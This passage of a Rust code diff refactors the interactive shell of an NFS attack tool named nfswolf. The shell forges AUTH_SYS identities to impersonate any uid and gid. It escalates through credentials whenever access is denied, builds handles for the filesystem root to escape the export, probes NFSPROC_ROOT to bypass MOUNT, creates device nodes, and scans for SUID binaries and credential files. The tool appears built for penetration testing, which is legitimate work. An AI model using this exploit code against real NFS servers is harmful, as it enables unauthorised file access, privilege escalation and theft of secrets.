         arg.clone_into(&mut self.hostname);
-        let uid = self.nfs3.uid();
-        let gid = self.nfs3.gid();
-        let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
-        self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
-        self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner).clear();
+        let uid = self.ops.uid();
+        let gid = self.ops.gid();
+        if let Err(e) = self.ops.change_identity(uid, gid, &self.hostname) {
+            eprintln!("{}", format!("hostname: {e}").red());
+            return;
+        }
         println!("{}", format!("hostname={}", self.hostname).green());
     }
 
     /// Print current AUTH_SYS identity.
     fn cmd_whoami(&self) {
-        println!("uid={}  gid={}  hostname={}", self.nfs3.uid(), self.nfs3.gid(), self.hostname);
+        println!("uid={}  gid={}  hostname={}", self.ops.uid(), self.ops.gid(), self.ops.machinename());
     }
 
     /// Switch both UID and GID at once (impersonate uid:gid).
     fn cmd_impersonate(&mut self, arg: &str) {
+        if !self.ops.supports_identity_change() {
+            eprintln!("{}", format!("impersonate: identity changes not supported on {}", self.ops.version_name()).red());
+            return;
+        }
         let (uid_opt, gid_opt) = parse_uid_gid(arg);
         match (uid_opt, gid_opt) {
             (Some(uid), Some(gid)) => {
-                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
-                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
-                self.cred_cache.lock().unwrap_or_else(std::sync::PoisonError::into_inner).clear();
+                if let Err(e) = self.ops.change_identity(uid, gid, &self.hostname) {
+                    eprintln!("{}", format!("impersonate: {e}").red());
+                    return;
+                }
                 println!("{}", format!("impersonating uid={uid} gid={gid}").green());
             },
             _ => eprintln!("{}", format!("impersonate: expected uid:gid  (got {arg:?})").red()),
@@ -1108,17 +1074,30 @@ impl NfsShell {
             eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
             return;
         }
+        if !self.ops.supports_mknod() {
+            eprintln!("{}", format!("mknod: not supported on {}", self.ops.version_name()).red());
+            return;
+        }
 
         let parts: Vec<&str> = line.split_whitespace().collect();
         if parts.len() != 4 {
             eprintln!("{}", "usage: mknod <name> c|b <major> <minor>".yellow());
             return;
         }
-        let (name, dev_type, major, minor) = if let (Some(&n), Some(&t), Some(&maj), Some(&min)) = (parts.first(), parts.get(1), parts.get(2), parts.get(3)) {
+        let (name, dev_type_str, major, minor) = if let (Some(&n), Some(&t), Some(&maj), Some(&min)) = (parts.first(), parts.get(1), parts.get(2), parts.get(3)) {
             (n, t, maj.parse::<u32>().unwrap_or(0), min.parse::<u32>().unwrap_or(0))
         } else {
             eprintln!("{}", "usage: mknod <name> c|b <major> <minor>".yellow());
             return;
+        };
+
+        let dev_type = match dev_type_str {
+            "c" => ShellDeviceType::Char,
+            "b" => ShellDeviceType::Block,
+            _ => {
+                eprintln!("{}", "mknod: type must be 'c' (char) or 'b' (block)".red());
+                return;
+            },
         };
 
         let (parent_fh, node_name) = match self.resolve_parent(name).await {
@@ -1129,21 +1108,9 @@ impl NfsShell {
             },
         };
 
-        let devdata = devicedata3 { dev_attributes: sattr3_with_mode(0o666), spec: specdata3 { specdata1: major, specdata2: minor } };
-        let what = match dev_type {
-            "c" => mknoddata3::NF3CHR(devdata),
-            "b" => mknoddata3::NF3BLK(devdata),
-            _ => {
-                eprintln!("{}", "mknod: type must be 'c' (char) or 'b' (block)".red());
-                return;
-            },
-        };
-
-        let args = MKNOD3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(node_name.into_bytes())) }, what };
-        match self.nfs3.mknod(&args).await {
-            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("mknod: created {name} ({dev_type} {major}:{minor})").green()),
-            Ok(Nfs3Result::Err((stat, _))) => report_write_stat("mknod", &Nfs3Fault::Status(Nfs3Error::from_nfsstat3(stat).unwrap_or(Nfs3Error::ServerFault))),
-            Err(e) => report_write_stat("mknod", &Nfs3Fault::Rpc(e)),
+        match self.ops.mknod(&parent_fh, &node_name, dev_type, major, minor, 0o666).await {
+            Ok(_) => println!("{}", format!("mknod: created {name} ({dev_type_str} {major}:{minor})").green()),
+            Err(e) => eprintln!("{}", format!("mknod: {e}").red()),
         }
     }
 
@@ -1154,19 +1121,19 @@ impl NfsShell {
     /// Recursively walk and report SUID/SGID binaries.
     async fn cmd_suid_scan(&self) {
         eprintln!("{}", "[*] scanning for SUID/SGID binaries...".blue());
-        suid_scan_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
+        suid_scan_recursive(&self.ops, self.cwd.clone(), self.cwd_path.clone()).await;
     }
 
     /// Recursively walk and report world-writable files and directories.
     async fn cmd_world_writable(&self) {
         eprintln!("{}", "[*] scanning for world-writable entries...".blue());
-        world_writable_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
+        world_writable_recursive(&self.ops, self.cwd.clone(), self.cwd_path.clone()).await;
     }
 
     /// Recursively walk and report files matching known credential/secret patterns.
     async fn cmd_secrets_scan(&self) {
         eprintln!("{}", "[*] scanning for secrets and credentials...".blue());
-        secrets_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
+        secrets_recursive(&self.ops, self.cwd.clone(), self.cwd_path.clone()).await;
     }
 
     /// `last [N]` / `lastb [N]` -- decode `/var/log/wtmp` (or `/var/log/btmp`).
@@ -1186,7 +1153,7 @@ impl NfsShell {
         let path = if lastb { "/var/log/btmp" } else { "/var/log/wtmp" };
         let label = if lastb { "lastb" } else { "last" };
 
-        let (fh, attrs) = match self.lookup_path(path).await {
+        let (fh, info) = match self.lookup_path(path).await {
             Ok(p) => p,
             Err(e) => {
                 eprintln!("{}", format!("{label}: {path}: {e}").red());
@@ -1194,11 +1161,11 @@ impl NfsShell {
                 return;
             },
         };
-        if attrs.size == 0 {
+        if info.size == 0 {
             println!("{}", format!("{path} is empty -- no records to show").yellow());
             return;
         }
-        let bytes = match self.read_all_cached(&fh).await {
+        let bytes = match self.ops.read_file(&fh).await {
             Ok(b) => b,
             Err(e) => {
                 eprintln!("{}", format!("{label}: read {path}: {e}").red());
@@ -1228,7 +1195,7 @@ impl NfsShell {
     /// SQLite parsing is out of scope for this command.
     async fn cmd_lastlog(&self, _arg: &str) {
         let lastlog_path = "/var/log/lastlog";
-        let (fh, attrs) = match self.lookup_path(lastlog_path).await {
+        let (fh, info) = match self.lookup_path(lastlog_path).await {
             Ok(p) => p,
             Err(e) => {
                 eprintln!("{}", format!("lastlog: {lastlog_path}: {e}").red());
@@ -1236,12 +1203,12 @@ impl NfsShell {
                 return;
             },
         };
-        if attrs.size == 0 {
+        if info.size == 0 {
             println!("{}", format!("{lastlog_path} is empty -- no users have logged in interactively").yellow());
             self.lastlog_hint_lastlog2().await;
             return;
         }
-        let bytes = match self.read_all_cached(&fh).await {
+        let bytes = match self.ops.read_file(&fh).await {
             Ok(b) => b,
             Err(e) => {
                 eprintln!("{}", format!("lastlog: read {lastlog_path}: {e}").red());
@@ -1253,7 +1220,7 @@ impl NfsShell {
         // Map UIDs to usernames via /etc/passwd if reachable; missing entries
         // render as "uid=N" rather than failing the whole command.
         let uid_to_user: Vec<(u32, String)> = match self.lookup_path("/etc/passwd").await {
-            Ok((pfh, _)) => match self.read_all_cached(&pfh).await {
+            Ok((pfh, _)) => match self.ops.read_file(&pfh).await {
                 Ok(b) => parse_passwd(&b),
                 Err(e) => {
                     eprintln!("{}", format!("lastlog: /etc/passwd unreadable ({e}); rendering UIDs numerically").yellow());
@@ -1296,54 +1263,52 @@ impl NfsShell {
         // Try every plausible filesystem-root candidate for the detected FS type
         // (ext4 inode 2, XFS 128/64/32, BTRFS subvols) rather than a single guess,
         // so a UUID-based XFS export is not silently limited to the ext4 root.
-        let candidates = FileHandleAnalyzer::construct_root_candidates(&self.export_root);
+        let export_fh = FileHandle::from_bytes(self.export_root.as_bytes());
+        let candidates = FileHandleAnalyzer::construct_root_candidates(&export_fh);
         if candidates.is_empty() {
             eprintln!("{}", "escape-root: unsupported filesystem type (ext4/xfs/btrfs only)".red());
             return;
         }
 
-        let mut last_stat: Option<nfsstat3> = None;
+        let mut last_err: Option<String> = None;
         for result in candidates {
-            let escaped_fh = result.root_handle;
-            let args = GETATTR3args { object: escaped_fh.to_nfs_fh3() };
-            match self.nfs3.getattr(&args).await {
-                Ok(Nfs3Result::Ok(ok)) => {
-                    let a = FileAttrs::from_fattr3(&ok.obj_attributes);
+            let candidate = ShellHandle(result.root_handle.as_bytes().to_vec());
+            match self.ops.getattr(&candidate).await {
+                Ok(info) => {
                     // Only a directory is the filesystem root; a non-directory hit
                     // is a real but wrong inode inside the export -- keep trying.
-                    if a.file_type != FileType::Directory {
+                    if info.file_type != ShellFileType::Directory {
                         continue;
                     }
                     eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {})", result.fs_type, result.inode_number).green().bold());
-                    eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
-                    eprintln!("{}", format!("    inode: {}  type: {:?}  mode: {:04o}", a.fileid, a.file_type, a.mode & 0o7777).cyan());
+                    eprintln!("{}", format!("    handle: {}", candidate.to_hex()).cyan());
+                    eprintln!("{}", format!("    inode: {}  type: {}  mode: {:04o}", info.fileid, info.type_name(), info.mode & 0o7777).cyan());
                     // Rebase the session's notion of "/" so absolute lookups walk
                     // the underlying filesystem root, not the narrow export.
-                    self.export_root = escaped_fh.clone();
-                    self.cwd = escaped_fh;
+                    self.export_root = candidate.clone();
+                    self.cwd = candidate;
                     self.cwd_path = String::from("/ [escaped]");
                     self.refresh_tab_cache().await;
                     return;
                 },
-                // Handle format accepted but root_squash blocks GETATTR -- the
-                // escape worked; rebase and let credential escalation read.
-                Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
-                    eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {}) -- root_squash active, GETATTR denied", result.fs_type, result.inode_number).green().bold());
-                    eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
-                    self.export_root = escaped_fh.clone();
-                    self.cwd = escaped_fh;
-                    self.cwd_path = String::from("/ [escaped]");
-                    self.refresh_tab_cache().await;
-                    return;
-                },
-                Ok(Nfs3Result::Err((stat, _))) => last_stat = Some(stat),
                 Err(e) => {
-                    eprintln!("{}", format!("escape-root: {e}").red());
-                    return;
+                    let msg = format!("{e:#}");
+                    // Handle format accepted but root_squash blocks GETATTR -- the
+                    // escape worked; rebase and let credential escalation read.
+                    if msg.contains("NFS3ERR_ACCES") || msg.contains("NFS3ERR_PERM") || msg.contains("ACCES") || msg.contains("PERM") {
+                        eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {}) -- root_squash active, GETATTR denied", result.fs_type, result.inode_number).green().bold());
+                        eprintln!("{}", format!("    handle: {}", candidate.to_hex()).cyan());
+                        self.export_root = candidate.clone();
+                        self.cwd = candidate;
+                        self.cwd_path = String::from("/ [escaped]");
+                        self.refresh_tab_cache().await;
+                        return;
+                    }
+                    last_err = Some(msg);
                 },
             }
         }
-        eprintln!("{}", format!("[!] no escape candidate resolved to the filesystem root (last status: {last_stat:?}) -- try `nfswolf escape` for the full inode scan").yellow());
+        eprintln!("{}", format!("[!] no escape candidate resolved to the filesystem root (last error: {}) -- try `nfswolf escape` for the full inode scan", last_err.as_deref().unwrap_or("none")).yellow());
     }
 
     /// Switch the current directory to an arbitrary file handle (hex).
@@ -1356,7 +1321,7 @@ impl NfsShell {
             return;
         }
 
-        let fh = match FileHandle::from_hex(hex) {
+        let fh = match ShellHandle::from_hex(hex) {
             Ok(fh) => fh,
             Err(e) => {
                 eprintln!("{}", format!("mount-handle: invalid hex: {e}").red());
@@ -1364,17 +1329,30 @@ impl NfsShell {
             },
         };
 
-        let args = GETATTR3args { object: fh.to_nfs_fh3() };
-        match self.nfs3.getattr(&args).await {
-            Ok(Nfs3Result::Ok(ok)) => {
-                let a = FileAttrs::from_fattr3(&ok.obj_attributes);
-                eprintln!("{}", format!("[+] handle OK  type={:?}  inode={}", a.file_type, a.fileid).green());
+        match self.ops.getattr(&fh).await {
+            Ok(info) => {
+                eprintln!("{}", format!("[+] handle OK  type={}  inode={}", info.type_name(), info.fileid).green());
                 self.cwd = fh;
                 self.cwd_path = String::from("<handle>");
                 self.refresh_tab_cache().await;
             },
-            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("mount-handle: {stat:?}").red()),
             Err(e) => eprintln!("{}", format!("mount-handle: {e}").red()),
+        }
+    }
+
+    /// Probe the obsolete NFSPROC_ROOT (proc 3) for a MOUNT bypass.
+    async fn cmd_root(&mut self) {
+        match self.ops.probe_root().await {
+            Ok(Some(fh)) => {
+                eprintln!("{}", "[!] Server returned a root handle via NFSPROC_ROOT -- MOUNT bypass!".red().bold());
+                eprintln!("    handle: {}", fh.to_hex());
+                eprintln!("    This is obsolete per RFC 1094 sec. 2.2.3. A server that");
+                eprintln!("    responds to it gives any client the root handle without");
+                eprintln!("    going through MOUNT's export ACL checks.");
+                self.cwd = fh;
+            },
+            Ok(None) => println!("{}", "NFSPROC_ROOT: server did not return a handle (expected -- procedure is obsolete since RFC 1094)".yellow()),
+            Err(e) => eprintln!("{}", format!("NFSPROC_ROOT: {e}").yellow()),
         }
     }
 
@@ -1440,28 +1418,25 @@ impl NfsShell {
     // Helpers
     // -------------------------------------------------------------------------
 
-    /// Resolve an optional name to a `FileHandle` via LOOKUP (None = cwd).
-    async fn resolve_handle(&self, name: Option<&str>) -> anyhow::Result<FileHandle> {
+    /// Resolve an optional name to a `ShellHandle` via LOOKUP (None = cwd).
+    async fn resolve_handle(&self, name: Option<&str>) -> anyhow::Result<ShellHandle> {
         match name {
             None => Ok(self.cwd.clone()),
             Some(n) => self.lookup_path(n).await.map(|(fh, _)| fh),
         }
     }
 
-    /// Resolve a path to (FileHandle, FileAttrs), handling absolute and relative paths.
+    /// Resolve a path to (ShellHandle, ShellFileInfo), handling absolute and relative paths.
     ///
     /// Paths starting with '/' are resolved from the export root (bearer token reuse
     /// per RFC 1094 sec. 2.3.3). Relative paths start from the current directory.
-    async fn lookup_path(&self, path: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
-        if path == "/" {
-            let attrs = getattr_fh(&self.nfs3, &self.export_root).await?;
-            return Ok((self.export_root.clone(), attrs));
-        }
-        if path.starts_with('/') { lookup_path_from(&self.nfs3, &self.export_root, path.trim_start_matches('/')).await } else { lookup_path_from(&self.nfs3, &self.cwd, path).await }
+    async fn lookup_path(&self, path: &str) -> anyhow::Result<(ShellHandle, ShellFileInfo)> {
+        let start = if path.starts_with('/') { &self.export_root } else { &self.cwd };
+        self.ops.lookup_path(start, path).await
     }
 
     /// Resolve a path into (parent_dir_fh, filename) for create/rename/remove operations.
-    async fn resolve_parent(&self, path: &str) -> anyhow::Result<(FileHandle, String)> {
+    async fn resolve_parent(&self, path: &str) -> anyhow::Result<(ShellHandle, String)> {
         match path.rfind('/') {
             None => Ok((self.cwd.clone(), path.to_owned())),
             Some(pos) => {
@@ -1470,364 +1445,145 @@ impl NfsShell {
                 if name.is_empty() {
                     anyhow::bail!("path must not end with '/'");
                 }
-                let parent_fh = self.lookup_path(parent_str).await.map(|(fh, _)| fh)?;
-                Ok((parent_fh, name))
+                let (fh, _) = self.lookup_path(parent_str).await?;
+                Ok((fh, name))
             },
         }
     }
-}
 
-// =============================================================================
-// Module-private helpers (free functions)
-// =============================================================================
-
-/// Walk path components from `start`, escalating credentials on ACCES.
-async fn lookup_path_from(nfs3: &Nfs3Client, start: &FileHandle, path: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
-    let mut dir = start.clone();
-    let mut attrs_opt: Option<FileAttrs> = None;
-
-    for component in path.split('/').filter(|c| !c.is_empty()) {
-        let (fh, attrs) = lookup_one(nfs3, &dir, component).await?;
-        dir = fh;
-        attrs_opt = Some(attrs);
-    }
-
-    let attrs = match attrs_opt {
-        Some(a) => a,
-        None => getattr_fh(nfs3, &dir).await?,
-    };
-    Ok((dir, attrs))
-}
-
-/// READDIRPLUS with credential escalation on ACCES.
-async fn list_dir(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Result<Vec<DirEntryPlus>> {
-    match try_readdirplus(nfs3, dir_fh).await {
-        Ok(v) => return Ok(v),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, dir_fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match try_readdirplus(&esc, dir_fh).await {
-            Ok(v) => {
-                tracing::debug!(uid, gid, "READDIRPLUS escalated");
-                return Ok(v);
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: cannot list directory (exhausted AUTH_SYS UID/GID escalation ladder)")
-}
-
-/// Like `list_dir`, but also returns the winning (uid, gid) if escalation was needed.
-async fn list_dir_with_winner(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Result<(Vec<DirEntryPlus>, Option<(u32, u32)>)> {
-    match try_readdirplus(nfs3, dir_fh).await {
-        Ok(v) => return Ok((v, None)),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, dir_fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match try_readdirplus(&esc, dir_fh).await {
-            Ok(v) => {
-                tracing::debug!(uid, gid, "READDIRPLUS escalated (cached)");
-                return Ok((v, Some((uid, gid))));
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: cannot list directory (exhausted AUTH_SYS UID/GID escalation ladder)")
-}
-
-/// READDIRPLUS without escalation; fills in missing attrs with GETATTR.
-///
-/// RFC 1813 sec. 3.3.17 makes name_attributes optional. After collecting all entries
-/// we issue GETATTR for any that came back without inline attributes.
-async fn try_readdirplus(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Result<Vec<DirEntryPlus>> {
-    // The library pages to eof and echoes the server's cookieverf between
-    // pages; MAX_DIR_ENTRIES is the hostile-server bound, since the server
-    // chooses both the page size and the end-of-file flag.
-    let mut out = nfs3.list_dir(dir_fh, MAX_DIR_ENTRIES).await.map_err(|e| anyhow::anyhow!("READDIRPLUS: {e}"))?;
-    if out.len() >= MAX_DIR_ENTRIES {
-        tracing::warn!(entries = out.len(), "READDIRPLUS hit entry cap; listing truncated (possible hostile server)");
-    }
-
-    // Fill-in pass: RFC 1813 sec. 3.3.17 makes both the handle and the
-    // attributes optional, and some servers omit them for entries crossing a
-    // mount boundary. Resolve what is missing so callers see a uniform listing.
-    for entry in &mut out {
-        if entry.attrs.is_some() || entry.name == "." || entry.name == ".." {
-            continue;
-        }
-        match entry.handle.clone() {
-            Some(fh) => entry.attrs = nfs3.attrs(&fh).await.ok(),
-            None => {
-                if let Ok((fh, attrs)) = nfs3.resolve(dir_fh, &entry.name).await {
-                    entry.attrs = match attrs {
-                        Some(a) => Some(a),
-                        None => nfs3.attrs(&fh).await.ok(),
-                    };
-                    entry.handle = Some(fh);
-                }
-            },
-        }
-    }
-    Ok(out)
-}
-
-/// LOOKUP one path component in `dir` with credential escalation.
-async fn lookup_one(nfs3: &Nfs3Client, dir: &FileHandle, name: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
-    match try_lookup_one(nfs3, dir, name).await {
-        Ok(r) => return Ok(r),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, dir).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match try_lookup_one(&esc, dir, name).await {
-            Ok(r) => {
-                tracing::debug!(uid, gid, name, "LOOKUP escalated");
-                return Ok(r);
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: cannot access {name}")
-}
-
-/// Single LOOKUP attempt without escalation.
-async fn try_lookup_one(nfs3: &Nfs3Client, dir: &FileHandle, name: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
-    let args = LOOKUP3args { what: diropargs3 { dir: dir.to_nfs_fh3(), name: filename3(Opaque::owned(name.as_bytes().to_vec())) } };
-    match nfs3.lookup(&args).await? {
-        Nfs3Result::Ok(ok) => {
-            let fh = FileHandle::from_nfs_fh3(&ok.object);
-            let attrs = match ok.obj_attributes {
-                Nfs3Option::Some(a) => FileAttrs::from_fattr3(&a),
-                Nfs3Option::None => getattr_fh(nfs3, &fh).await?,
-            };
-            Ok((fh, attrs))
-        },
-        Nfs3Result::Err((stat, _)) => anyhow::bail!("LOOKUP {name}: {stat:?}"),
-    }
-}
-
-/// GETATTR a file handle, used when LOOKUP omits obj_attributes.
-async fn getattr_fh(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<FileAttrs> {
-    let args = GETATTR3args { object: fh.to_nfs_fh3() };
-    match nfs3.getattr(&args).await? {
-        Nfs3Result::Ok(ok) => Ok(FileAttrs::from_fattr3(&ok.obj_attributes)),
-        Nfs3Result::Err((stat, _)) => anyhow::bail!("GETATTR: {stat:?}"),
-    }
-}
-
-/// Fetch the owner (uid, gid) of a handle via GETATTR. Returns None on error.
-async fn getattr_owner(nfs3: &Nfs3Client, fh: &FileHandle) -> Option<((u32, u32), u32)> {
-    nfs3.attrs(fh).await.ok().map(|a| ((a.uid, a.gid), a.mode))
-}
-
-/// Read file and print to stdout with credential escalation on ACCES.
-async fn read_escalated(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<()> {
-    match try_read_print(nfs3, fh).await {
-        Ok(()) => return Ok(()),
-        Err(e) if !is_nfs_acces(&e) => return Err(e),
-        Err(_) => {},
-    }
-    let facts = getattr_owner(nfs3, fh).await;
-    let caller = (nfs3.uid(), nfs3.gid());
-    for (uid, gid) in credential_ladder_with(caller, facts.map(|f| f.0), facts.map(|f| f.1), &[]) {
-        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], nfs3.machinename())), uid, gid);
-        match try_read_print(&esc, fh).await {
-            Ok(()) => {
-                tracing::debug!(uid, gid, "READ escalated");
-                return Ok(());
-            },
-            Err(e) if !is_nfs_acces(&e) => return Err(e),
-            Err(_) => {},
-        }
-    }
-    anyhow::bail!("NFS3ERR_ACCES: permission denied reading file")
-}
-
-/// Single attempt: read `fh` and write its content (capped at CAT_MAX_BYTES) to stdout.
-///
-/// Loops at the advancing offset until `ok.eof` or an empty reply: NFSv3 READ may
-/// legally return fewer bytes than requested before EOF (RFC 1813 sec. 3.3.6 --
-/// servers cap a single READ at rtmax/rtpref), so a single READ would silently
-/// truncate the tail of a small file on such a server. An explicit notice is
-/// printed when the 1 MiB cap is reached.
-async fn try_read_print(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<()> {
-    let mut stdout = std::io::stdout();
-    let mut offset = 0u64;
-    let mut last_byte: Option<u8> = None;
-    let mut truncated = false;
-    loop {
-        let remaining = CAT_MAX_BYTES.saturating_sub(u32::try_from(offset).unwrap_or(u32::MAX));
-        if remaining == 0 {
-            truncated = true;
-            break;
-        }
-        let count = remaining.min(CHUNK_SIZE);
-        match nfs3.read_at(fh, offset, count).await {
-            Ok(chunk) => {
-                if chunk.data.is_empty() {
-                    break;
-                }
-                // Stdout write failure is non-fatal during cat (pipe closed, etc.).
-                drop(stdout.write_all(&chunk.data));
-                last_byte = chunk.data.last().copied();
-                offset = offset.saturating_add(chunk.data.len() as u64);
-                if chunk.eof {
-                    break;
-                }
-            },
-            Err(e) => anyhow::bail!("READ: {e}"),
-        }
-    }
-    if last_byte.is_some_and(|b| b != b'\n') {
+    /// Print the command reference, adapted per NFS version.
+    fn print_help(&self) {
+        let ver = self.ops.version_name();
+        println!("{}", format!("{ver} shell commands:").bold());
         println!();
+        println!("{}", "Navigation:".bold().underline());
+        println!("  ls [-a] [--sort=FIELD] [-r] [path]  list directory; -a adds inode/nlink/used/rdev/atime/ctime columns; -r reverses");
+        println!("  cd <path>                  change directory  (/ = export root, /abs = absolute)");
+        println!("  pwd                        print current path");
+        println!("  tree [depth]               recursive tree (default depth 3; hidden dirs always shown)");
+        println!("  find <pattern>             find filenames containing pattern");
+        println!();
+        println!("{}", "File operations:".bold().underline());
+        println!("  cat <file>                 print file contents");
+        println!("  get [-r] <remote> [local | dir/]  download file/tree (auto-UID; dir/ keeps the basename)");
+        println!("  put <local> <remote>       upload file  [--allow-write]");
+        println!("  rm <file>                  remove file  [--allow-write]");
+        println!("  mkdir <dir>                create directory  [--allow-write]");
+        println!("  rmdir <dir>                remove directory  [--allow-write]");
+        println!("  mv <src> <dst>             rename/move  [--allow-write]");
+        println!("  cp <src> <dst>             copy file  [--allow-write]");
+        println!("  symlink <target> <name>    create symlink  [--allow-write]");
+        println!("  readlink <path>            read symlink target");
+        println!();
+        println!("{}", "Attributes:".bold().underline());
+        println!("  stat [path]                show file attributes");
+        println!("  chmod <mode> <path>        set mode (octal)  [--allow-write]");
+        println!("  chown <uid>[:<gid>] <path> set owner  [--allow-write]");
+        println!();
+        if self.ops.supports_identity_change() {
+            println!("{}", "Identity  (AUTH_SYS is client-asserted, RFC 5531 sec. 14):".bold().underline());
+        } else {
+            println!("{}", "Identity  (read-only on this version):".bold().underline());
+        }
+        println!("  whoami                     show current uid:gid");
+        if self.ops.supports_identity_change() {
+            println!("  uid <n>                    switch UID");
+            println!("  gid <n>                    switch GID");
+            println!("  impersonate <uid>:<gid>    switch both");
+        }
+        println!();
+        if self.ops.supports_mknod() {
+            println!("{}", "Devices:".bold().underline());
+            println!("  mknod <name> c|b <maj> <min>  create device node  [--allow-write]");
+            println!();
+        }
+        println!("{}", "Analysis:".bold().underline());
+        println!("  suid-scan                  find SUID/SGID binaries");
+        println!("  world-writable             find world-writable files");
+        println!("  secrets-scan               find credential/secret files");
+        println!("  last [N]                   decode /var/log/wtmp (login history; per util-linux 2.42 last.c)");
+        println!("  lastb [N]                  decode /var/log/btmp (failed-login history)");
+        println!("  lastlog                    decode /var/log/lastlog (last login per UID)");
+        println!();
+        println!("{}", "Escape (F-2.1 -- construct filesystem root handle):".bold().underline());
+        println!("  escape-root                build and switch to FS root handle");
+        println!("  mount-handle <hex>         jump to arbitrary file handle");
+        println!("  handle                     print current dir handle (hex)");
+        println!("  root                       probe NFSPROC_ROOT (obsolete MOUNT bypass)");
+        println!();
+        println!("{}", "Local:".bold().underline());
+        println!("  lcd [dir]   lls [dir]   lpwd   lmkdir <dir>");
+        println!();
+        println!("{}", "Session:".bold().underline());
+        println!("  history     help     exit");
     }
-    if truncated {
-        eprintln!("{}", format!("[!] output truncated at {CAT_MAX_BYTES} bytes -- use `get` for the full file").yellow());
-    }
-    Ok(())
 }
+
+// =============================================================================
+// Version-neutral helpers (generic over ShellOps)
+// =============================================================================
 
 /// Hard cap on a single in-memory read. The NFS server is untrusted; a hostile
-/// or buggy server can return endless non-EOF chunks, so `read_all` must bound
+/// or buggy server can return endless non-EOF chunks, so `download_file` must bound
 /// its buffer instead of growing until OOM.
 const READ_ALL_MAX_BYTES: u64 = 256 * 1024 * 1024; // 256 MiB
 
-/// Read the entire content of `fh` into a buffer (for cp / download).
-async fn read_all(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<Vec<u8>> {
-    // The cap is the point: a hostile or buggy server can return endless
-    // non-EOF chunks, and the library loop honours the bound rather than
-    // growing until OOM.
-    let cap = usize::try_from(READ_ALL_MAX_BYTES).unwrap_or(usize::MAX);
-    let buf = nfs3.read_all(fh, cap).await.map_err(|e| anyhow::anyhow!("READ: {e}"))?;
-    if buf.len() >= cap {
-        anyhow::bail!("READ aborted at {cap} bytes: exceeds the {READ_ALL_MAX_BYTES}-byte cap (untrusted server returning endless non-EOF data)");
-    }
-    Ok(buf)
-}
-
-/// Download `fh` to a local file path, reading in chunks.
+/// Download `fh` to a local file path via ShellOps, reading in chunks.
 ///
 /// Returns `(bytes_written, sha256_hex)`.  The SHA-256 is computed over the
 /// full downloaded content and printed alongside the byte count so the operator
 /// has an instant integrity reference for report evidence chains.
-async fn download_file(nfs3: &Nfs3Client, fh: &FileHandle, dest_path: &str, _total_size: u64) -> anyhow::Result<(u64, String)> {
+async fn download_file<O: ShellOps>(ops: &O, fh: &ShellHandle, dest_path: &str) -> anyhow::Result<(u64, String)> {
     let mut file = std::fs::File::create(dest_path).map_err(|e| anyhow::anyhow!("create {dest_path}: {e}"))?;
     let mut hasher = Sha256::new();
     let mut offset = 0u64;
     loop {
-        let args = READ3args { file: fh.to_nfs_fh3(), offset, count: CHUNK_SIZE };
-        match nfs3.read(&args).await? {
-            Nfs3Result::Ok(ok) => {
-                let data = ok.data.as_ref();
-                file.write_all(data).map_err(|e| anyhow::anyhow!("write: {e}"))?;
-                hasher.update(data);
